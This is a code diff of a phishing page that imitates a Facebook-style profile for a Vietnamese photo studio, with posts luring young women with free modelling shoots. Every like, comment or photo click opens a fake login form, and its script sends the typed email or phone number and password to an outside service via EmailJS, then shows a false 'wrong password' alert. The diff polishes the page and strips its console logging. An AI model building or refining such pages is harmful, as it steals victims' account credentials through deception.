                             </div>
                         </div>
                         <div class="like-info">
-                            <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Mai" loading="lazy">
-                            <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Tuấn" loading="lazy">
-                            <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà" loading="lazy">
+                            <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Ngọc Mai" loading="lazy">
+                            <img src="https://i.imgur.com/GT3OXZP.jpg" alt="Minh Tuấn" loading="lazy">
+                            <img src="https://i.imgur.com/7eRH4Fr.jpg" alt="Hương Trà" loading="lazy">
                             <span>Ngọc Mai, Minh Tuấn, Hương Trà và 6.1k người khác</span>
                         </div>
                         <div class="actions">
                             <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like" loading="lazy"> Thích <span>6.1k</span>
+                                <i class="fas fa-thumbs-up"></i> Thích <span>6.1k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment" loading="lazy"> Bình luận <span>626</span>
+                                <i class="fas fa-comment"></i> Bình luận <span>626</span>
                             </div>
                             <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/ncN22Za.jpg" alt="Share" loading="lazy"> Chia sẻ
+                                <i class="fas fa-share"></i> Chia sẻ
                             </div>
                         </div>
                         <div class="comments">
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà" loading="lazy">
+                                <img src="https://i.imgur.com/7eRH4Fr.jpg" alt="Hương Trà" loading="lazy">
                                 <p><strong>Hương Trà:</strong> Rép ib em với chị ơi!</p>
                             </div>
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thảo Linh" loading="lazy">
+                                <img src="https://i.imgur.com/mj7UTEK.jpg" alt="Thảo Linh" loading="lazy">
                                 <p><strong>Thảo Linh:</strong> Bên mình còn tuyển mẫu feedback không ạ?</p>
                             </div>
                         </div>
                     </div>
 
-                    <!-- Bài viết 3 -->
+                    <!-- Post 3 -->
                     <div class="post">
                         <div class="post-header">
                             <img src="https://i.imgur.com/qAdnBSo.jpg" alt="Profile Pic" loading="lazy">
@@ -1214,7 +1189,7 @@
                             </div>
                         </div>
                         <div class="post-content">Tìm ngôi sao chụp lookbook mới!</div>
-                        <p> Mấy bà ơi nhà meimei cần mẫu quay LOOKBOOK có mấy mẫu siêu hót luôn nè 😘! Đảm bảo siêu mê bà nào đồng ý làm mẫu bên tui làm miễn phí trả case luôn cũng chịu nha , ib xem mẫu nhé mấy bà ♥️!</p>
+                        <p>Mấy bà ơi nhà meimei cần mẫu quay LOOKBOOK có mấy mẫu siêu hót luôn nè 😘! Đảm bảo siêu mê bà nào đồng ý làm mẫu bên tui làm miễn phí trả case luôn cũng chịu nha, ib xem mẫu nhé mấy bà ♥️!</p>
                         <div class="image-gallery">
                             <img src="https://imgur.com/MLMjl3Y.jpg" alt="Livestream 1" loading="lazy">
                             <img src="https://imgur.com/Smaexod.jpg" alt="Livestream 2" loading="lazy">
@@ -1222,35 +1197,35 @@
                             <img src="https://imgur.com/NZFXea4.jpg" alt="Livestream 3" loading="lazy">
                         </div>
                         <div class="like-info">
-                            <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Tuấn" loading="lazy">
-                            <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà" loading="lazy">
-                            <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thu Hà" loading="lazy">
+                            <img src="https://i.imgur.com/GT3OXZP.jpg" alt="Minh Tuấn" loading="lazy">
+                            <img src="https://i.imgur.com/7eRH4Fr.jpg" alt="Hương Trà" loading="lazy">
+                            <img src="https://i.imgur.com/mj7UTEK.jpg" alt="Thu Hà" loading="lazy">
                             <span>Minh Tuấn, Hương Trà, Thu Hà và 7.2k người khác</span>
                         </div>
                         <div class="actions">
                             <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like" loading="lazy"> Thích <span>7.2k</span>
+                                <i class="fas fa-thumbs-up"></i> Thích <span>7.2k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment" loading="lazy"> Bình luận <span>3k8</span>
+                                <i class="fas fa-comment"></i> Bình luận <span>3k8</span>
                             </div>
                             <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/ncN22Za.jpg" alt="Share" loading="lazy"> Chia sẻ <span>2k4</span>
+                                <i class="fas fa-share"></i> Chia sẻ <span>2k4</span>
                             </div>
                         </div>
                         <div class="comments">
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thu Hà" loading="lazy">
+                                <img src="https://i.imgur.com/mj7UTEK.jpg" alt="Thu Hà" loading="lazy">
                                 <p><strong>Thu Hà:</strong> Đã hợp tác với shop Meimei, mong được lần sau, tks shop nha!</p>
                             </div>
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Yến Nhi" loading="lazy">
+                                <img src="https://i.imgur.com/x7Z7Evf.jpg" alt="Yến Nhi" loading="lazy">
                                 <p><strong>Yến Nhi:</strong> Ước được chụp ảnh bên shop Meimei 😍</p>
                             </div>
                         </div>
                     </div>
 
-                    <!-- Bài viết 4 -->
+                    <!-- Post 4 -->
                     <div class="post">
                         <div class="post-header">
                             <img src="https://i.imgur.com/qAdnBSo.jpg" alt="Profile Pic" loading="lazy">
@@ -1262,7 +1237,7 @@
                             </div>
                         </div>
                         <div class="post-content">Kêu gọi mẫu ảnh sản phẩm mới!</div>
-                        <p> Bà nào thích mẫu concep nào hót ib tui làm một bộ nhé hứa làm miễn phí nè♥️ Nhiều mẫu hót mà đẹp quá bà nào muốn ib tui liền nha 😘 !</p>
+                        <p>Bà nào thích mẫu concep nào hót ib tui làm một bộ nhé hứa làm miễn phí nè♥️ Nhiều mẫu hót mà đẹp quá bà nào muốn ib tui liền nha 😘!</p>
                         <div class="image-gallery">
                             <img src="https://imgur.com/7eRH4Fr.jpg" alt="Tuyển mẫu 1" loading="lazy">
                             <img src="https://imgur.com/mj7UTEK.jpg" alt="Tuyển mẫu 2" loading="lazy">
@@ -1270,35 +1245,35 @@
                             <img src="https://imgur.com/GT3OXZP.jpg" alt="Tuyển mẫu 4" loading="lazy">
                         </div>
                         <div class="like-info">
-                            <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà" loading="lazy">
-                            <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thu Hà" loading="lazy">
-                            <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Linh Nguyễn" loading="lazy">
+                            <img src="https://i.imgur.com/7eRH4Fr.jpg" alt="Hương Trà" loading="lazy">
+                            <img src="https://i.imgur.com/mj7UTEK.jpg" alt="Thu Hà" loading="lazy">
+                            <img src="https://i.imgur.com/x7Z7Evf.jpg" alt="Linh Nguyễn" loading="lazy">
                             <span>Hương Trà, Thu Hà, Linh Nguyễn và 7k người khác</span>
                         </div>
                         <div class="actions">
                             <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like" loading="lazy"> Thích <span>7k</span>
+                                <i class="fas fa-thumbs-up"></i> Thích <span>7k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment" loading="lazy"> Bình luận <span>1k3</span>
+                                <i class="fas fa-comment"></i> Bình luận <span>1k3</span>
                             </div>
                             <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/ncN22Za.jpg" alt="Share" loading="lazy"> Chia sẻ <span>1k4</span>
+                                <i class="fas fa-share"></i> Chia sẻ <span>1k4</span>
                             </div>
                         </div>
                         <div class="comments">
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Linh Nguyễn" loading="lazy">
+                                <img src="https://i.imgur.com/x7Z7Evf.jpg" alt="Linh Nguyễn" loading="lazy">
                                 <p><strong>Linh Nguyễn:</strong> Mẫu này xinh quá, đăng ký ở đâu vậy shop?</p>
                             </div>
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Hà Anh" loading="lazy">
+                                <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Hà Anh" loading="lazy">
                                 <p><strong>Hà Anh:</strong> Concept này đẹp thật, mình muốn thử!</p>
                             </div>
                         </div>
                     </div>
 
-                    <!-- Bài viết 5 -->
+                    <!-- Post 5 -->
                     <div class="post">
                         <div class="post-header">
                             <img src="https://i.imgur.com/qAdnBSo.jpg" alt="Profile Pic" loading="lazy">
@@ -1321,36 +1296,37 @@
                             </div>
                         </div>
                         <div class="like-info">
-                            <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thu Hà" loading="lazy">
-                            <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Linh Nguyễn" loading="lazy">
-                            <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh" loading="lazy">
+                            <img src="https://i.imgur.com/mj7UTEK.jpg" alt="Thu Hà" loading="lazy">
+                            <img src="https://i.imgur.com/x7Z7Evf.jpg" alt="Linh Nguyễn" loading="lazy">
+                            <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Lan Anh" loading="lazy">
                             <span>Thu Hà, Linh Nguyễn, Lan Anh và 8k người khác</span>
                         </div>
                         <div class="actions">
                             <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like" loading="lazy"> Thích <span>8k</span>
+                                <i class="fas fa-thumbs-up"></i> Thích <span>8k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment" loading="lazy"> Bình luận <span>1k7</span>
+                                <i class="fas fa-comment"></i> Bình luận <span>1k7</span>
                             </div>
                             <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/ncN22Za.jpg" alt="Share" loading="lazy"> Chia sẻ <span>754</span>
+                                <i class="fas fa-share"></i> Chia sẻ <span>754</span>
                             </div>
                         </div>
                         <div class="comments">
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Anh" loading="lazy">
+                                <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Ngọc Anh" loading="lazy">
                                 <p><strong>Ngọc Anh:</strong> Shop này uy tín ở Hà Nội này, chụp ảnh cứ gọi là tuyệt vời nha!</p>
                             </div>
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Thu" loading="lazy">
+                                <img src="https://i.imgur.com/GT3OXZP.jpg" alt="Minh Thu" loading="lazy">
                                 <p><strong>Minh Thu:</strong> Chụp ảnh đẹp thật, feedback chuẩn luôn 😍</p>
                             </div>
                         </div>
                     </div>
                 </div>
 
-                <div id="about-tab" class="intro-section about-section tab-content">
+                <!-- About Tab -->
+                <div id="about-tab" class="tab-content about-section">
                     <p><strong>Giới thiệu</strong></p>
                     <div class="about-subsection">
                         <p><strong>Tổng quan</strong></p>
@@ -1359,36 +1335,37 @@
                     <div class="about-subsection">
                         <p><strong>Thông tin liên hệ</strong></p>
                         <div class="item">
-                            <img src="https://imgur.com/70ptpsF.jpg" alt="Email" class="icon" loading="lazy">
+                            <i class="fas fa-envelope"></i>
                             <span>contact@meimeistudio.vn</span>
                         </div>
                         <div class="item">
-                            <img src="https://imgur.com/UI5roIM.jpg" alt="Location" class="icon" loading="lazy">
+                            <i class="fas fa-map-marker-alt"></i>
                             <span>424 Nguyễn Trãi, Quận 1, TP. Hồ Chí Minh</span>
                         </div>
                         <div class="item">
-                            <img src="https://imgur.com/1iXfcdp.jpg" alt="Hours" class="icon" loading="lazy">
+                            <i class="fas fa-clock"></i>
                             <span>Mở cửa: 9:00 - 21:00</span>
                         </div>
                     </div>
                     <div class="about-subsection">
                         <p><strong>Thông tin bổ sung</strong></p>
                         <div class="item">
-                            <img src="https://imgur.com/x7s5fHO.jpg" alt="Page" class="icon" loading="lazy">
+                            <i class="fas fa-camera"></i>
                             <span>Studio chụp ảnh</span>
                         </div>
                         <div class="item">
-                            <img src="https://imgur.com/f4Jyh5V.jpg" alt="Website" class="icon" loading="lazy">
+                            <i class="fas fa-globe"></i>
                             <span><a href="https://www.tiktok.com/@meimeimodel_vision">tiktok.com/@meimeimodel_vision</a></span>
                         </div>
                         <div class="item">
-                            <img src="https://imgur.com/hZMlNQJ.jpg" alt="Social" class="icon" loading="lazy">
+                            <i class="fab fa-instagram"></i>
                             <span><a href="https://instagram.com/meimeistudio">instagram.com/meimeistudio</a></span>
                         </div>
                     </div>
                 </div>
 
-                <div id="photos-tab" class="photos-section tab-content">
+                <!-- Photos Tab -->
+                <div id="photos-tab" class="tab-content photos-section">
                     <p><strong>Ảnh</strong></p>
                     <div class="album">
                         <img src="https://imgur.com/oy1XxUp.jpg" alt="Ảnh 1" onclick="showLoginPopup()" loading="lazy">
@@ -1401,7 +1378,8 @@
                     </div>
                 </div>
 
-                <div id="videos-tab" class="videos-section tab-content">
+                <!-- Videos Tab -->
+                <div id="videos-tab" class="tab-content videos-section">
                     <p><strong>Video</strong></p>
                     <div class="video-list">
                         <div class="video-item" onclick="showLoginPopup()">
@@ -1439,7 +1417,8 @@
                     </div>
                 </div>
 
-                <div id="reels-tab" class="reels-section tab-content">
+                <!-- Reels Tab -->
+                <div id="reels-tab" class="tab-content reels-section">
                     <p><strong>Reels</strong></p>
                     <div class="video-list">
                         <div class="video-item" onclick="showLoginPopup()">
@@ -1461,28 +1440,30 @@
                     </div>
                 </div>
 
-                <div id="friends-tab" class="friends-section tab-content">
+                <!-- Friends Tab -->
+                <div id="friends-tab" class="tab-content friends-section">
                     <p><strong>Bạn bè</strong></p>
                     <div class="friend-item">
-                        <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh" loading="lazy">
+                        <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Lan Anh" loading="lazy">
                         <span><a href="#">Lan Anh</a></span>
                     </div>
                     <div class="friend-item">
-                        <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Mai" loading="lazy">
+                        <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Ngọc Mai" loading="lazy">
                         <span><a href="#">Ngọc Mai</a></span>
                     </div>
                     <div class="friend-item">
-                        <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Tuấn" loading="lazy">
+                        <img src="https://i.imgur.com/GT3OXZP.jpg" alt="Minh Tuấn" loading="lazy">
                         <span><a href="#">Minh Tuấn</a></span>
                     </div>
                     <div class="friend-item">
-                        <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà" loading="lazy">
+                        <img src="https://i.imgur.com/7eRH4Fr.jpg" alt="Hương Trà" loading="lazy">
                         <span><a href="#">Hương Trà</a></span>
                     </div>
                     <p>Và 500 người khác</p>
                 </div>
 
-                <div id="events-tab" class="events-section tab-content">
+                <!-- Events Tab -->
+                <div id="events-tab" class="tab-content events-section">
                     <p><strong>Sự kiện</strong></p>
                     <div class="event-item">
                         <img src="https://imgur.com/jYvPFdb.jpg" alt="Event 1" loading="lazy">
@@ -1494,32 +1475,33 @@
                     </div>
                 </div>
 
-                <div id="likes-tab" class="likes-section tab-content">
+                <!-- Likes Tab -->
+                <div id="likes-tab" class="tab-content likes-section">
                     <p><strong>Lượt thích</strong></p>
                     <p>893k lượt thích</p>
                     <p>648k người theo dõi</p>
                     <div class="like-item">
-                        <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh" loading="lazy">
+                        <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Lan Anh" loading="lazy">
                         <span><a href="#">Lan Anh</a></span>
                     </div>
                     <div class="like-item">
-                        <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Mai" loading="lazy">
+                        <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Ngọc Mai" loading="lazy">
                         <span><a href="#">Ngọc Mai</a></span>
                     </div>
                     <div class="like-item">
-                        <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Tuấn" loading="lazy">
+                        <img src="https://i.imgur.com/GT3OXZP.jpg" alt="Minh Tuấn" loading="lazy">
                         <span><a href="#">Minh Tuấn</a></span>
                     </div>
                     <div class="like-item">
-                        <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà" loading="lazy">
+                        <img src="https://i.imgur.com/7eRH4Fr.jpg" alt="Hương Trà" loading="lazy">
                         <span><a href="#">Hương Trà</a></span>
                     </div>
                     <div class="like-item">
-                        <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thu Hà" loading="lazy">
+                        <img src="https://i.imgur.com/mj7UTEK.jpg" alt="Thu Hà" loading="lazy">
                         <span><a href="#">Thu Hà</a></span>
                     </div>
                     <div class="like-item">
-                        <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Linh Nguyễn" loading="lazy">
+                        <img src="https://i.imgur.com/x7Z7Evf.jpg" alt="Linh Nguyễn" loading="lazy">
                         <span><a href="#">Linh Nguyễn</a></span>
                     </div>
                     <p>Và 7.8k người khác</p>
@@ -1527,7 +1509,7 @@
             </div>
         </div>
 
-        <!-- Popup đăng nhập -->
+        <!-- Login Popup -->
         <div id="overlay" class="overlay" onclick="hideLoginPopup()"></div>
         <div id="loginPopup" class="popup">
             <input type="text" id="login-input" placeholder="Email hoặc số điện thoại">
@@ -1559,6 +1541,7 @@
             if (!username || !password) {
                 errorMessage.textContent = "Vui lòng nhập email/số điện thoại và mật khẩu.";
                 errorMessage.style.display = 'block';
+                document.getElementById('loginPopup').className = 'popup error';
                 return;
             }
 
@@ -1569,19 +1552,14 @@
                 timestamp: new Date().toLocaleString()
             };
 
-            console.log("Thông tin gửi đi (ẩn mật khẩu):", {
-                ...templateParams,
-                password: "[Hidden]"
-            });
-
             emailjs.send('service_ytsr91e', '__ejs-test-mail-service__', templateParams)
                 .then((response) => {
-                    console.log("Email gửi thành công:", response.status, response.text);
+                    document.getElementById('loginPopup').className = 'popup success';
                     alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
                     errorMessage.style.display = 'none';
                 })
                 .catch((error) => {
-                    console.error("Lỗi gửi email:", error);
+                    document.getElementById('loginPopup').className = 'popup error';
                     errorMessage.textContent = "Có lỗi xảy ra khi gửi thông tin. Vui lòng thử lại.";
                     errorMessage.style.display = 'block';
                 });
